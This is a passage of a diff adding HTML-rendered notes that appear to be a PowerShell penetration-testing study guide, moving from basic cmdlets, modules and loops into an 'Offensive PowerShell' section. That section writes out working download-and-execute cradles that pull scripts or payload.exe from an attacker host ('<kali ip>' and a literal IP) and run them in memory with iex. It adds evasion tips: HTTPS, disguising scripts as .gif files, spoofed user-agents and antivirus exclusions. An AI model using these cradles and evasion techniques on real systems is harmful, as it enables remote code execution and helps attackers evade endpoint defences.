+</span><span class="bp">$_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">variable</span><span class="w"> </span><span class="nx">For</span><span class="w"> </span><span class="nx">current</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">pipeline</span><span class="w">
+
+</span></code></pre></div></div>
+
+<h3 id="get-service">Get-Service</h3>
+<p>Get us information regarding currently installed services and can be useful in the case we can identify a service which might be vulnerable to a privilege escalation exploit.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Service</span><span class="w"> </span><span class="s2">"s*"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort-Object</span><span class="w"> </span><span class="nx">Status</span><span class="w"> </span><span class="nt">-Descending</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// all services that start with "s"
+</code></pre></div></div>
+
+<h2 id="modules">Modules</h2>
+
+<ul>
+  <li>Is a set of powershell functionalities grouped together in the form of a single file that will typically have a “.psm1” file extension.</li>
+</ul>
+
+<h3 id="the-components-that-can-make-up-a-module">The components that can make up a module:</h3>
+<p>powershell scripts (.ps1)
+additional assemblies, help files or scripts
+module manifest file
+directory which is used to contain all of the above</p>
+
+<h3 id="types">Types</h3>
+<p>script modules:</p>
+
+<p>→ https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-script-module?view=powershell-7
+binary modules:
+   → https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-binary-module?view=powershell-7
+manifest modules:
+   → https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-module-manifest?view=powershell-7
+dynamic modules: 
+   → http://go.microsoft.com/fwlink/?LinkId=141554</p>
+
+<h3 id="get-module">Get-Module</h3>
+<p>to obtain a list of all currently imported modules</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Module</span><span class="w">
+</span></code></pre></div></div>
+
+<p>To list all modules available to us</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Module</span><span class="w"> </span><span class="nt">-ListAvailable</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="import-module">Import-Module</h3>
+<p>modules that we want to use, will first need to be imported into our current powershell session</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\module.psm1</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>After importing, all cmdlets of that module is available to us</li>
+</ul>
+
+<blockquote>
+  <p>[+] example
+PowerSploit = https://github.com/PowerShellMafia/PowerSploit</p>
+</blockquote>
+
+<p>1 - download the module
+2 - we need to copy to one of the module paths specified by the <strong>$Env:PSModulePath</strong>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$</span><span class="nn">Env</span><span class="p">:</span><span class="nv">PSModulePath</span><span class="w">
+</span><span class="n">//</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">these</span><span class="w"> </span><span class="nx">paths</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Perhaps the AV will detect the powersploit framework as malicious. its normal.
+In this case create an exclude directory For your AV software.</p>
+</blockquote>
+
+<p>3 - extract and copy all of its contents into our chosen module directory into a folder called ‘PowerSploit’
+4 - Import the module</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import-Module</span><span class="w"> </span><span class="nx">PowerSploit</span><span class="w">
+</span><span class="n">Get-Module</span><span class="w">
+</span></code></pre></div></div>
+
+<p>5 - To list all the commands For that module</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Command</span><span class="w"> </span><span class="nt">-Module</span><span class="w"> </span><span class="nx">PowerSploit</span><span class="w">
+</span></code></pre></div></div>
+
+<p>6 - There are help files For all of the modules</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Help</span><span class="w"> </span><span class="nx">Write-HihackDLL</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="scripts">Scripts</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\example.ps1
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">Param</span><span class="p">{</span><span class="w">
+	</span><span class="p">[</span><span class="n">parameter</span><span class="p">(</span><span class="n">mandatory</span><span class="o">=</span><span class="bp">$true</span><span class="p">)][</span><span class="n">string</span><span class="p">]</span><span class="nv">$file</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span><span class="n">Get-Content</span><span class="w"> </span><span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>this script takes a file name as argument For which it creates a variable called “$file”, and runs the “Get-Content” cmdlet on our variable.</p>
+</blockquote>
+
+<p>.\example1.ps1 users.txt
+// users.txt contains several usernames, so the script will return the content of the file</p>
+
+<h3 id="alternatively">Alternatively</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">	</span><span class="nv">$file</span><span class="o">=</span><span class="s2">"users.txt"</span><span class="w">
+	</span><span class="n">Get-Content</span><span class="w"> </span><span class="nv">$file</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>create a variable with the file, then just run getcontent with that variable</p>
+</blockquote>
+
+<h3 id="loops-statements">Loops Statements</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">	</span><span class="kr">for</span><span class="p">()</span><span class="w">
+	</span><span class="kr">foreach</span><span class="p">()</span><span class="w">
+	</span><span class="kr">while</span><span class="p">()</span><span class="w">
+	</span><span class="kr">do</span><span class="p">{</span><span class="n">something</span><span class="p">}</span><span class="kr">while</span><span class="p">()</span><span class="w">
+	</span><span class="kr">do</span><span class="p">{</span><span class="n">something</span><span class="p">}</span><span class="kr">until</span><span class="p">()</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="to-get-more-information">To get more information</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Help</span><span class="w"> </span><span class="nx">about_</span><span class="err">&lt;</span><span class="nx">Foreach</span><span class="p">,</span><span class="w"> </span><span class="nx">For</span><span class="p">,</span><span class="w"> </span><span class="nx">Do</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">While</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="loop-statement--loop-body">Loop Statement / Loop Body</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">	</span><span class="nv">$services</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Service</span><span class="w">
+	</span><span class="nx">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$service</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$services</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="nv">$service</span><span class="o">.</span><span class="nf">name</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>returns the name of each service with the <strong>.name</strong> property in the loop body.</p>
+</blockquote>
+
+<h3 id="alternatively-1">Alternatively</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">	</span><span class="n">Get-Service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">name</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>using the built-in cmdlets ForEach_Object</p>
+
+<h3 id="where-object">Where-Object</h3>
+<p>allows us to select objects within a collection based on their property values in regard to when used For a loop.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nx">C:\Powershell\</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">name</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"xls"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="port-scan-example-">Port scan example [+]</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="nv">$ports</span><span class="o">=</span><span class="p">(</span><span class="mi">444</span><span class="p">,</span><span class="mi">81</span><span class="p">);</span><span class="w">
+</span><span class="nv">$ip</span><span class="o">=</span><span class="s2">"192.168.13.250"</span><span class="p">;</span><span class="w">
+
+</span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$port</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$ports</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="kr">try</span><span class="p">{</span><span class="nv">$socket</span><span class="o">=</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TcpClient</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="w"> </span><span class="nv">$port</span><span class="p">);}</span><span class="w">
+
+</span><span class="kr">catch</span><span class="p">{};</span><span class="w">
+
+	</span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$socket</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="bp">$null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="n">echo</span><span class="w"> </span><span class="nv">$ip</span><span class="s2">":"</span><span class="nv">$port</span><span class="s2">" - Closed"</span><span class="p">;</span><span class="w">	</span><span class="p">}</span><span class="w"> </span><span class="kr">else</span><span class="w"> </span><span class="p">{</span><span class="n">echo</span><span class="w"> </span><span class="nv">$ip</span><span class="s2">":"</span><span class="nv">$port</span><span class="s2">" - Open"</span><span class="p">;</span><span class="nv">$socket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$null</span><span class="p">;}}</span><span class="w">
+
+</span><span class="o">.</span><span class="n">\Scan-Ports.ps1</span><span class="w">
+
+</span></code></pre></div></div>
+
+<h2 id="objects">Objects</h2>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Process</span><span class="w"> </span><span class="nx">Format-List</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Each objects has a multiple methods that we can use to manipulate a particular object.</li>
+  <li>To get a list of methods For objects associated with a cmdlet, we can use get-member</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-Member</span><span class="w"> </span><span class="nt">-MemberType</span><span class="w"> </span><span class="nx">Method</span><span class="w">
+</span></code></pre></div></div>
+
+<ol>
+  <li>we have identified an object (in this case, a process <strong>firefox</strong>) we would like to manipulate in some way using the Get-Process cmdlet</li>
+  <li>We have determined the methods that are available For use with the objects that were returned by using:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-Member</span><span class="w"> </span><span class="nx">cmdlet</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">pipeline</span><span class="w">
+</span></code></pre></div>    </div>
+  </li>
+  <li>We have decided that the Kill method is the method we would like to use For that process( as an example)</li>
+</ol>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Process</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"firefox"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Kill</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>we can call the get-process along with the -Name parameter For the firefox process, and pipe the Kill method that we identified using the get-member cmdlet.
+This command will kill any firefox processes.</p>
+</blockquote>
+
+<h3 id="creating-net-objects">Creating .NET objects</h3>
+<p>As an example of creating a basic object based off of a .NET class with the “Net-Object” cmdlet, we can use the “Net.WebClient” .NET system class to download a file to a target system with the following code:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="nv">$webclient</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="w">
+</span><span class="nv">$payload_url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"https://&lt;kali ip&gt;/payload.exe"</span><span class="w">
+</span><span class="nv">$file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\ProgramData\payload.exe"</span><span class="w">
+</span><span class="nv">$webclient</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="nv">$payload_url</span><span class="p">,</span><span class="w"> </span><span class="nv">$file</span><span class="p">)</span><span class="w">
+
+</span></code></pre></div></div>
+
+<ul>
+  <li>explainning the code - line by line</li>
+</ul>
+
+<ol>
+  <li>We create a variable called $webclient which instantiates the System.Net.WebClient .NET class, which is used to create a web client.</li>
+  <li>We then create another variable $payload_url, which is the url to our payload</li>
+  <li>The $file variable is then used as the location to which we want to save the payload on the target system</li>
+  <li>And finally, we call the $webclient variable with the DownloadFile method which downloads our payload.exe to the target.</li>
+</ol>
+
+<h1 id="offensive-powershell">Offensive PowerShell</h1>
+
+<h2 id="downloading-and-execution">Downloading and Execution</h2>
+
+<ul>
+  <li>A summary of methods we can use For <strong>In-Memory</strong> execution with PowerShell 2.0:</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Net.WebClient</span><span class="w"> </span><span class="nx">DownloadString</span><span class="w"> </span><span class="nx">Method</span><span class="w">
+</span><span class="n">Net.WebClient</span><span class="w"> </span><span class="nx">DownloadData</span><span class="w"> </span><span class="nx">Method</span><span class="w">
+</span><span class="n">Net.WebClient</span><span class="w"> </span><span class="nx">OpenRead</span><span class="w"> </span><span class="nx">Method</span><span class="w">
+</span><span class="o">.</span><span class="nf">NET</span><span class="w"> </span><span class="p">[</span><span class="n">Net.HttpWebRequest</span><span class="p">]</span><span class="w"> </span><span class="kr">class</span><span class="w">
+</span><span class="nc">Word</span><span class="err">.</span><span class="nc">Application</span><span class="w"> </span><span class="nc">COM</span><span class="w"> </span><span class="nc">Object</span><span class="w">
+</span><span class="nc">Excel</span><span class="err">.</span><span class="nc">Application</span><span class="w"> </span><span class="nc">COM</span><span class="w"> </span><span class="nc">Object</span><span class="w">
+</span><span class="nc">InternetExplorer</span><span class="err">.</span><span class="nc">Application</span><span class="w"> </span><span class="nc">COM</span><span class="w"> </span><span class="nc">Object</span><span class="w">
+</span><span class="nc">MsXml2</span><span class="err">.</span><span class="nc">ServerXmlHttp</span><span class="w"> </span><span class="nc">COM</span><span class="w"> </span><span class="nc">Object</span><span class="w">
+</span><span class="nc">Certutil</span><span class="err">.</span><span class="nc">exe</span><span class="w"> </span><span class="nc">w</span><span class="err">/</span><span class="w"> </span><span class="err">-</span><span class="nc">ping</span><span class="w"> </span><span class="nc">argument</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>A summary of methods we can use For <strong>Disk-Based</strong> execution with PowerShell 2.0:</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Net.WebClient</span><span class="w"> </span><span class="nx">DownloadFile</span><span class="w"> </span><span class="nx">method</span><span class="w">
+</span><span class="n">BITSAdmin.exe</span><span class="w">
+</span><span class="nx">Certutil.exe</span><span class="w"> </span><span class="nx">w/</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="nx">argument</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>These two methods are commonly referred to as <strong>Download Cradles</strong></p>
+</blockquote>
+
+<h3 id="from-the-powershell-console">From the PowerShell console</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s2">"http://&lt;kali ip&gt;/script.ps1"</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<p>//iex = Invoke-Expression</p>
+
+<h3 id="from-the-cmdexe">From the cmd.exe</h3>
+<p>we can run the same command from a stardard windows command prompt:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://&lt;kali ip&gt;/script.ps1'</span><span class="p">)</span><span class="w">
+
+</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s2">"http://10.90.60.80:5923/winpeas.exe"</span><span class="p">)</span><span class="w">
+	</span><span class="nx">//note</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">when</span><span class="w"> </span><span class="nx">executed</span><span class="w"> </span><span class="nx">within</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">need</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">single</span><span class="w"> </span><span class="nx">quotes</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="netwebclient-downloadstring-method">Net.WebClient DownloadString Method</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="nv">$downloader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="w">
+</span><span class="nv">$payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://&lt;kali ip&gt;/script.ps1"</span><span class="w">
+</span><span class="nv">$command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$downloader</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="nv">$payload</span><span class="p">)</span><span class="w">
+</span><span class="n">Invoke-Expression</span><span class="w"> </span><span class="nv">$command</span><span class="w">
+
+</span></code></pre></div></div>
+
+<p>Instantiate our System.Net.WebClient class as the $downloader variable
+Create our $payload variable (URL to the script)
+Create our $command variable
+Execute our $command with the <strong>Invoke-Expression</strong> (iex) cmdlet</p>
+
+<h3 id="example---download-string">Example - Download String</h3>
+<p>save in Get-ProcessPaths.ps1</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-List</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">Path</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Host in a web server
+Then:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s2">"http://&lt;kali ip&gt;/Get-ProcessPaths.ps1"</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>The DownloadString method will execute our remote script in the PowerShell process memory, so in regard to not dropping an artifact to disk, its a great way to stay under the radar of endpoint security solutions that are not monitoring powershell memory.</li>
+</ul>
+
+<blockquote>
+  <p>Evasion Tips [+]
+It should be noted that where possible when hosting your remote PowerShell script, to have an SSL certificate configured on the attacker machine.
+This helps in evading over-the-wire heuristics as our traffic will go over HTTPS.
+In the previous examples, we simply used HTTP, which could easily be detected.</p>
+</blockquote>
+
+<blockquote>
+  <p>Evasion Tips [+]
+Another trick we can use which might help in evading basic file extension heuristics is to give our Powershell script a different extension, For instance <strong>Logo.gif</strong>. PowerShell will still execute it as a .ps1 script</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s2">"http://&lt;kali ip&gt;/Logo.gif"</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Evasion Tips [+]
+Net.WebClient class allows us to specify a custom user-agent string when sending the request to our attacker URL.
+This can help us evade detection mechanisms that are flagging on abnormal user-agent strings crossing the wire.
+We can do that with the <strong>Headers.Add</strong> method:</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="nv">$downloader</span><span class="o">.</span><span class="nf">Headers</span><span class="o">.</span><span class="nf">Add</span><span class="p">(</span><span class="s2">"user-agent"</span><span class="p">,</span><span class="w"> </span><span class="s2">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36"</span><span class="p">)</span><span class="w">
+	</span><span class="n">//</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">can</span><span class="w"> </span><span class="nx">insert</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">second</span><span class="w"> </span><span class="nx">line</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">our</span><span class="w"> </span><span class="nx">code.</span><span class="w"> </span><span class="nx">Just</span><span class="w"> </span><span class="nx">after</span><span class="w"> </span><span class="nx">declaring</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nv">$downloader</span><span class="w"> </span><span class="nx">variable</span><span class="w">
+
+</span></code></pre></div></div>
+
+<h3 id="example---downloadfile">Example - DownloadFile</h3>
+<p>This method will download your executable to disk
+Although noisy and not recommended if trying to remain stealthy, its still sometimes a handy method to quickly download a file to the target system.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="nv">$downloader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="w">
+</span><span class="nv">$payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://&lt;kali ip&gt;/payload.exe"</span><span class="w">
+</span><span class="nv">$local_file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\programdata\payload.exe"</span><span class="w">
+</span><span class="nv">$downloader</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="nv">$payload</span><span class="p">,</span><span class="w"> </span><span class="nv">$local_file</span><span class="p">)</span><span class="w">
+
+</span></code></pre></div></div>
+
+<p>Instantiate our System.Net.WebClient class as the $downloader variable
+payload URL variable
+local_file variable (will save to this location)
+Call the object variable with the “DownloadFile” method and our $payload and $local_file variables</p>
+
+<ul>
+  <li>Executing the file once its on our target system can be accomplished using the call operator (&amp;) and variable we created For the payload ($local_file)</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&amp;</span><span class="w"> </span><span class="nv">$local_file</span><span class="w">
+</span></code></pre></div></div>
+
+<h4>[+]</h4>
+<p>We can configure the Net.WebClient class methods to use the systems proxy and default credentials</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="nv">$downloader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="w">
+</span><span class="nv">$payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">http://</span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="nx">/script.ps1</span><span class="w">
+</span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$downloader</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="nv">$payload</span><span class="p">)</span><span class="w">
+
+</span><span class="nv">$proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Net.WebRequest</span><span class="p">]::</span><span class="n">GetSystemWebProxy</span><span class="p">()</span><span class="w">
+</span><span class="nv">$proxy</span><span class="o">.</span><span class="nf">Credentials</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Net.CredentialCache</span><span class="p">]::</span><span class="n">DefaultCredentials</span><span class="w">
+</span><span class="nv">$downloader</span><span class="o">.</span><span class="nf">Proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$proxy</span><span class="w">
+
+</span><span class="n">iex</span><span class="w"> </span><span class="nv">$cmd</span><span class="w">
+
+</span></code></pre></div></div>
+
+<h4 id="netwebrequest">Net.WebRequest</h4>
+<p>To download and execute scripts on a target, in memory</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="nv">$req</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Net.WebRequest</span><span class="p">]::</span><span class="n">Create</span><span class="p">(</span><span class="s2">"http://&lt;kali ip&gt;/script.ps1"</span><span class="p">)</span><span class="w">
+</span><span class="nv">$res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$req</span><span class="o">.</span><span class="nf">GetResponse</span><span class="p">()</span><span class="w">
+</span><span class="n">iex</span><span class="w"> </span><span class="p">([</span><span class="n">System.IO.StreamReader</span><span class="p">](</span><span class="nv">$res</span><span class="o">.</span><span class="nf">GetResponseStream</span><span class="p">()))</span><span class="o">.</span><span class="nf">ReadToEnd</span><span class="p">()</span><span class="w">
+
+</span></code></pre></div></div>
+
+<p>Instantiate our System.Net.WebRequest class as the $req variable
+Create a $res variable to store the WebRequest response
+Use the “Invoke-Expression” alias (iex) to invoke the System.IO.StreamReader and execute our code</p>
+
+<blockquote>
+  <p>It can also be configured to use a proxy
+we can add this before the iex line</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="nv">$proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Net.WebRequest</span><span class="p">]::</span><span class="n">GetSystemWebProxy</span><span class="p">()</span><span class="w">
+</span><span class="nv">$proxy</span><span class="o">.</span><span class="nf">Credentials</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Net.CredentialCache</span><span class="p">]::</span><span class="n">DefaultCredentials</span><span class="w">
+</span><span class="nv">$req</span><span class="o">.</span><span class="nf">Proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$proxy</span><span class="w">
+</span></code></pre></div></div>
+
+<h4 id="systemxmlxmldocument">System.Xml.XmlDocument</h4>
+<p>Allow us to execute a powershell command or any system command (in memory)</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="n">Create</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">XML</span><span class="w"> </span><span class="nx">file:</span><span class="w">
+</span><span class="err">&lt;</span><span class="nf">?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">"1.0"</span><span class="nf">?</span><span class="err">&gt;</span><span class="w">
+</span><span class="err">&lt;</span><span class="kr">command</span><span class="err">&gt;</span><span class="w">
+	</span><span class="err">&lt;</span><span class="n">a</span><span class="err">&gt;</span><span class="w">
+		</span><span class="err">&lt;</span><span class="n">execute</span><span class="err">&gt;</span><span class="nx">Get-Process</span><span class="err">&lt;</span><span class="nx">/execute</span><span class="err">&gt;</span><span class="w">
+	</span><span class="err">&lt;</span><span class="n">/a</span><span class="err">&gt;</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">/command</span><span class="err">&gt;</span><span class="w">
+
+</span></code></pre></div></div>
+
+<p>once our xml file is hosted</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="nv">$xmldoc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Xml.XmlDocument</span><span class="w">
+</span><span class="nv">$xmldoc</span><span class="o">.</span><span class="nf">Load</span><span class="p">(</span><span class="s2">"http://&lt;kali ip&gt;/file.xml"</span><span class="p">)</span><span class="w">
